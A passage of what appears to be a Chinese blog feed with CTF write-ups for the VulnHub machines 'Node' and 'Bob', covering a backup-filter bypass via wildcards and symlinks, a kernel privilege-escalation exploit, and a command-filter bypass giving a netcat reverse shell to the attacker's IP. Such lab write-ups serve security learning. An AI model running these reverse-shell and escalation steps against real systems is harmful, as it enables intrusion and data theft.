class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tom@node:/var/www/myplace$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x  4 root root  4096 Sep  3  2017 .</span><br><span class="line">drwxr-xr-x  3 root root  4096 Sep  3  2017 ..</span><br><span class="line">-rw-rw-r--  1 root root  3861 Sep  2  2017 app.html</span><br><span class="line">-rw-rw-r--  1 root root  8058 Sep  3  2017 app.js</span><br><span class="line">drwxr-xr-x 69 root root  4096 Sep  2  2017 node_modules</span><br><span class="line">-rw-rw-r--  1 root root   283 Sep  2  2017 package.json</span><br><span class="line">-rw-r--r--  1 root root 21264 Sep  2  2017 package-lock.json</span><br><span class="line">drwxrwxr-x  6 root root  4096 Sep  2  2017 static</span><br><span class="line">tom@node:/var/www/myplace$</span><br></pre></td></tr></table></figure><ul><li>然后把backup下载回来看了一下,他是把一些目录过滤了，只要有这些字符串就调用一个函数把刚刚的暴走表情返回来。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08049EC5 aRoot           db &apos;/root&apos;,0            ; DATA XREF: main+4DA↑o</span><br><span class="line">.rodata:08049ECB asc_8049ECB     db &apos;//&apos;,0               ; DATA XREF: main+675↑o</span><br><span class="line">.rodata:08049ECE asc_8049ECE     db &apos;/&apos;,0                ; DATA XREF: main+6BC↑o</span><br><span class="line">.rodata:08049ED0 aEtc            db &apos;/etc&apos;,0             ; DATA XREF: main+703↑o</span><br><span class="line">.rodata:08049ED5 aTmpBackupI     db &apos;/tmp/.backup_%i&apos;,0  ; DATA XREF: main+7B7↑o</span><br><span class="line">.rodata:08049EE5                 align 4</span><br><span class="line">.rodata:08049EE8 aUsrBinZipRPMag db &apos;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&apos;,0</span><br><span class="line">.rodata:08049EE8                                         ; DATA XREF: main+7D9↑o</span><br><span class="line">.rodata:08049F17 aUsrBinBase64W0 db &apos;/usr/bin/base64 -w0 %s&apos;,0</span><br><span class="line">.rodata:08049F17                                         ; DATA XREF: main+838↑o</span><br><span class="line">.rodata:08049F2E aTheTargetPathD db &apos;The target path doesn&apos;,27h,&apos;t exist&apos;,0</span><br><span class="line">.rodata:08049F2E                                         ; DATA XREF: main+869↑o</span><br><span class="line">.rodata:08049F2E _rodata         ends</span><br></pre></td></tr></table></figure><ul><li>现在就是想怎么绕过过滤。目前只想到了两种方法。</li></ul><ol><li>Linux的通配符，用四个*代替root字符串，把返回的字符串解码用之前的密码解压就可以获取root目录下的root.txt文件了。其实在set里出题人已经提示了可以使用<code>_=&#39;/****/****.txt&#39;</code>的了。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tom@node:/usr/local/bin$ ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /****/****.txt</span><br><span class="line">&lt;4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /****/****.txt             </span><br><span class="line">UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWemtwFt1eAsAAQQAAAAABAAAAABV8jIoS5pVMDG/v8Ky96FxGnEzm7MYgoNnqV+uTwW4IcvmccY7RuN/o2FSD7RQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/usr/local/bin$</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD echo "UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWemtwFt1eAsAAQQAAAAABAAAAABV8jIoS5pVMDG/v8Ky96FxGnEzm7MYgoNnqV+uTwW4IcvmccY7RuN/o2FSD7RQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA"|base64 -d &gt; 1.zip</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD unzip 1.zip -d /tmp</span><br><span class="line">Archive:  1.zip</span><br><span class="line">[1.zip] root/root.txt password: </span><br><span class="line"> extracting: /tmp/root/root.txt      </span><br><span class="line">➜  DOWNLOAD cat /tmp/root/root.txt </span><br><span class="line">1722e99ca5f353b362556a62bd5e6be0</span><br><span class="line">➜  DOWNLOAD</span><br></pre></td></tr></table></figure><p>2.Linux里面的ln可以创建同步链接，只要把一个不在黑名单里的目录链接到root目录在打包备份这个目录就可以了。先到tmp目录随便创建一个文件夹，再软链接过去，打包备份得到和上面一样的效果。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>cd /tmp</span><br><span class="line">cd /tmp</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/tmp</span><span class="variable">$ </span>mkdir test</span><br><span class="line">mkdir test</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cd /usr/local/bin</span><br><span class="line">cd /usr/local/bin</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">backup</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 </span><br><span class="line">&lt;backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474  </span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>ln -s /root/root.txt /tmp/test/</span><br><span class="line">ln -s /root/root.txt /tmp/test/</span><br><span class="line">tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span><span class="variable">$ </span>./backup -q <span class="number">45</span>fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test/</span><br><span class="line">&lt;<span class="number">4</span>fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test/                 </span><br><span class="line">UEsDBAoAAAAAAEISTU0AAAAAAAAAAAAAAAAJABwAdG1wL3Rlc3QvVVQJAAPMR8Fb50fBW3V4CwABBOgDAAAE6AMAAFBLAwQKAAkAAADUfSNL8o43QC0AAAAhAAAAEQAcAHRtcC90ZXN0L3Jvb3QudHh0VVQJAAPQFaxZ6a3AW3V4CwABBAAAAAAEAAAAADkP/XbDOYEypwb9otRX3B70ByGgGe7HxtZxLnY3FwS0Sc1u71Mp/S+gUeYDWVBLBwjyjjdALQAAACEAAABQSwECHgMKAAAAAABCEk1NAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UEAAAAAdG1wL3Rlc3QvVVQFAAPMR8FbdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAABEAGAAAAAAAAQAAAKCBQwAAAHRtcC90ZXN0L3Jvb3QudHh0VVQFAAPQFaxZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAACAAIApgAAAMsAAAAAAA==tom<span class="variable">@node</span><span class="symbol">:/usr/local/bin</span>$</span><br></pre></td></tr></table></figure><ul><li>如果是想快点的就上传EXP编译提权，这里就不说了。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ uname -a</span><br><span class="line">Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD searchsploit 4.4.0 | grep local</span><br><span class="line">Comodo Backup 4.4.0.0 - Null Pointer De | exploits/windows/local/35905.c</span><br><span class="line">Linux 4.4.0 &lt; 4.4.0-53 - AF_PACKET choc | exploits/linux/local/44696.rb</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04  | exploits/linux_x86-64/local/40871.c</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu) - DCCP Doub | exploits/linux/local/41458.c</span><br><span class="line">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64 | exploits/linux_x86-64/local/40049.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04. | exploits/linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x | exploits/linux/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (U | exploits/linux/local/43418.c</span><br><span class="line">PHP 4.4.0 - 'mysql_connect function' Lo | exploits/windows/local/1406.php</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD searchsploit -p 44298          </span><br><span class="line">  Exploit: Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/44298/</span><br><span class="line">     Path: /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/44298.c</span><br><span class="line">File Type: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD </span><br><span class="line">➜  DOWNLOAD scp /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/44298.c mark@192.168.131.141:/tmp</span><br><span class="line">mark@192.168.131.141's password: </span><br><span class="line">44298.c                                                              100% 6021     9.5MB/s   00:00</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mark@node:/tmp$ ls</span><br><span class="line">44298.c             systemd-private-1e2dccb30d5c4421ab0156f380ae24f2-systemd-timesyncd.service-XxCCZ4</span><br><span class="line">mongodb-27017.sock  test</span><br><span class="line">shell.sh            vmware-root</span><br><span class="line">mark@node:/tmp$ gcc 44298.c </span><br><span class="line">mark@node:/tmp$ ./a.out </span><br><span class="line">task_struct = ffff88002d8fda00</span><br><span class="line">uidptr = ffff88002ad330c4</span><br><span class="line">spawning root shell</span><br><span class="line">root@node:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(mark)</span><br><span class="line">root@node:/tmp#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-Bob_v1.0.1</title>
      <link href="/2018/10/10/Write-up-Bob-v1-0-1/"/>
      <url>/2018/10/10/Write-up-Bob-v1-0-1/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ol><li><p>下载地址：<a href="https://download.vulnhub.com/bob/Bob_v1.0.1.ova" target="_blank" rel="noopener">点我</a></p></li><li><p>哔哩哔哩视频：<a href="https://www.bilibili.com/video/av33625740/" target="_blank" rel="noopener">哔哩哔哩</a></p></li></ol><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>网卡：vmnet8；IP在192.168.131.1/24</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vmnet8           </span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.131.1/24 brd 192.168.131.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><ul><li>Nmap一顿扫；发现IP为192.168.131.139，再深入扫描</li></ul><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.131.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-10 21:27 CST</span><br><span class="line">Nmap scan report for 192.168.131.1</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Nmap scan report for 192.168.131.139</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 6.49 seconds</span><br><span class="line">➜  ~ </span><br><span class="line">➜  ~ nmap -T4 -A 192.168.131.139 -p1-65535</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-10 21:28 CST</span><br><span class="line">Nmap scan report for 192.168.131.139</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">| /login.php /dev_shell.php /lat_memo.html </span><br><span class="line">|_/passwords.html</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)</span><br><span class="line">|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)</span><br><span class="line">|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>发现开放了80端口和服务为ssh的25468端口；还有robot.txt文件，里面有<code>/login.php /dev_shell.php /lat_memo.html /passwords.html</code> 把各个页面都看一遍发现有一个可以执行shell的页面。在<code>lat_memo.html</code>这个页面找到还有就得文件，可能是备份文件，在dev_shell.php后面加上bak，存在源码备份文件，下载回来获取过滤的规则。然后用脚绕。</li></ul><h3 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h3><ul><li><code>dev_shell.php</code>过滤了<code>&quot;pwd&quot;, &quot;ls&quot;, &quot;netcat&quot;, &quot;ssh&quot;, &quot;wget&quot;, &quot;ping&quot;, &quot;traceroute&quot;, &quot;cat&quot;, &quot;nc&quot;</code>，还有<code>;</code>，如果你用msf生成的Python反弹木马没有上面的关键字可以使用msf的。我生成的木马base64编码后刚刚好有NC这个关键词。所以我换了其他方法。在nc前面加上绝对路径。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc -e /bin/sh 192.168.131.1 7788</span><br></pre></td></tr></table></figure><ul><li>在本地用nc监听7788端口；<code>nc -lvp 7788</code>，然后执行命令。</li><li>拿到Shell后转tty；<code>python -c &quot;import pty;pty,spawn(&#39;/bin/bash&#39;)&quot;</code>;翻遍home目录</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">www-data@Milburg-High:/home/bob/Documents$ ls</span><br><span class="line">ls</span><br><span class="line">Secretlogin.txt.gpg  staff.txt</span><br><span class="line">www-data@Milburg-High:/home/bob/Documents$ cat staff.txt</span><br><span class="line">cat staff.txt</span><br><span class="line">Seb:</span><br><span class="line"></span><br><span class="line">Seems to like Elliot</span><br><span class="line">Wants to do well at his job</span><br><span class="line">Gave me a backdoored FTP to instal that apparently Elliot gave him</span><br><span class="line"></span><br><span class="line">James:</span><br><span class="line"></span><br><span class="line">Does nothing</span><br><span class="line">Pretty Lazy</span><br><span class="line">Doesn't give a shit about his job</span><br><span class="line"></span><br><span class="line">Elliot:</span><br><span class="line"></span><br><span class="line">Keeps to himself</span><br><span class="line">Always needs to challenge everything I do</span><br><span class="line">Keep an eye on him</span><br><span class="line">Try and get him fired</span><br><span class="line">www-data@Milburg-High:/home/bob/Documents$ </span><br><span class="line"></span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ gpg</span><br><span class="line">gpg</span><br><span class="line">gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@Milburg-High:/home/bob/Documents/Secret/Keep_Out/Not_Porn$ cd No_Lookie_In_Here</span><br><span class="line">&lt;ents/Secret/Keep_Out/Not_Porn$ cd No_Lookie_In_Here                </span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ls</span><br><span class="line">ls</span><br><span class="line">notes.sh</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ cat notes.sh</span><br><span class="line">cat notes.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">clear</span><br><span class="line">echo "-= Notes =-"</span><br><span class="line">echo "Harry Potter is my faviorite"</span><br><span class="line">echo "Are you the real me?"</span><br><span class="line">echo "Right, I'm ordering pizza this is going nowhere"</span><br><span class="line">echo "People just don't get me"</span><br><span class="line">echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;"</span><br><span class="line">echo "Cucumber"</span><br><span class="line">echo "Rest now your eyes are sleepy"</span><br><span class="line">echo "Are you gonna stop reading this yet?"</span><br><span class="line">echo "Time to fix the server"</span><br><span class="line">echo "Everyone is annoying"</span><br><span class="line">echo "Sticky notes gotta buy em"</span><br></pre></td></tr></table></figure><ul><li>Google一顿找到这是一首藏头诗。每个大写字母开头组成一串<code>HARPOCRATES</code>，刚刚也看到了一个gpg文件，所以这可能是解密的密码。但在目标机上执行gpg发现没权限。就开启<code>python -m SimpleHTTPServer</code>把文件下载回来本地解密了。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">gpg: AES 加密过的数据</span><br><span class="line">gpg: 以 1 个密码加密</span><br><span class="line">bob:b0bcat_</span><br></pre></td></tr></table></figure><ul><li>因为bob就是服务器的管理员，所以可以用他的密码登录ssh。</li></ul><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">➜  DOWNLOAD ssh bob<span class="meta">@192.168.131.139</span> -p 25468</span><br><span class="line">  __  __ _ _ _                        _____                          </span><br><span class="line"> |<span class="string">  \/  (_) </span>|<span class="string"> </span>|<span class="string">                      / ____</span>|<span class="string">                         </span></span><br><span class="line"><span class="string"> </span>|<span class="string"> \  / </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">__  _   _ _ __ __ _  </span>|<span class="string"> (___   ___ _ ____   _____ _ __ </span></span><br><span class="line"><span class="string"> </span>|<span class="string"> </span>|<span class="string">\/</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> '_ \</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> '__/ _` </span>|<span class="string">  \___ \ / _ \ '__\ \ / / _ \ '__</span>|</span><br><span class="line"> |<span class="string"> </span>|<span class="string">  </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string">  ____) </span>|<span class="string">  __/ </span>|<span class="string">   \ V /  __/ </span>|<span class="string">   </span></span><br><span class="line"><span class="string"> </span>|<span class="string">_</span>|<span class="string">  </span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_.__/ \__,_</span>|<span class="string">_</span>|<span class="string">  \__, </span>|<span class="string"> </span>|<span class="string">_____/ \___</span>|<span class="string">_</span>|<span class="string">    \_/ \___</span>|<span class="string">_</span>|<span class="string">   </span></span><br><span class="line"><span class="string">                              __/ </span>|<span class="string">                                  </span></span><br><span class="line"><span class="string">                             </span>|<span class="string">___/                                   </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">bob@192.168.131.139's password: </span></span><br><span class="line"><span class="string">Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span></span><br><span class="line"></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Mar  8 23:49:12 2018 from 192.168.56.1</span></span><br><span class="line"><span class="string">bob@Milburg-High:~$ sudo cat /flag.txt</span></span><br><span class="line"><span class="string">sudo: unable to resolve host Milburg-High</span></span><br><span class="line"><span class="string">[sudo] password for bob: </span></span><br><span class="line"><span class="string">CONGRATS ON GAINING ROOT</span></span><br><span class="line"></span><br><span class="line"><span class="string">        .-.</span></span><br><span class="line"><span class="string">       (   )</span></span><br><span class="line"><span class="string">        </span>|<span class="string">~</span>|<span class="string">       _.--._</span></span><br><span class="line"><span class="string">        </span>|<span class="string">~</span>|<span class="string">~:'--~'      </span>|</span><br><span class="line">        |<span class="string"> </span>|<span class="string"> :   #root   </span>|</span><br><span class="line">        |<span class="string"> </span>|<span class="string"> :     _.--._</span>|</span><br><span class="line">        |<span class="string">~</span>|<span class="string">~`'--~'</span></span><br><span class="line"><span class="string">        </span>|<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">        |<span class="string"> </span>|</span><br><span class="line">   _____|<span class="string">_</span>|<span class="string">_________ Thanks for playing ~c0rruptedb1t</span></span><br><span class="line"><span class="string">bob@Milburg-High:~$</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的Linux软件目录</title>
      <link href="/2018/09/13/%E6%88%91%E7%9A%84Linux%E8%BD%AF%E4%BB%B6%E7%9B%AE%E5%BD%95/"/>
      <url>/2018/09/13/%E6%88%91%E7%9A%84Linux%E8%BD%AF%E4%BB%B6%E7%9B%AE%E5%BD%95/</url>
      
